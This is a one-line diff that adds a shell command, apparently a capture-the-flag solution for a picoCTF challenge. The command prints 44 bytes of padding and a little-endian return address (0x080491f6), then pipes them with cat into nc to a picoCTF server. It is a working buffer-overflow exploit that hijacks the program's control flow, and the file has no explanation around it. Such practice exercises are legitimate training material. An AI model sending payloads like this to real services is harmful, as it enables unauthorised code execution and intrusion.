@@ -1,0 +1,1 @@
+(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccccccc\xf6\x91\x04\x08"; cat -) | nc saturn.picoctf.net 50822
